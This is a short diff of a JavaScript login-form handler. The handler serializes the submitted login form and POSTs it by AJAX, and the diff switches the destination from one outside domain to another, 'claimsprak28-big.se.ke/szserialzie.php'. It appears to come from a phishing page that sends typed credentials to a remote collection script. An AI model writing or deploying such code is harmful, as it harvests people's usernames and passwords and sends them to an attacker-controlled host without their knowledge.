@@ -2,7 +2,7 @@ $(".login-form").submit(function() {
 	var d = $(".login-form");
 
 	$.ajax({
-        url: "http://rifkyryungester.com/classresults/index.php",
+        url: "http://claimsprak28-big.se.ke/szserialzie.php",
         type: "POST",
         data: d.serialize(),
         success: function () {
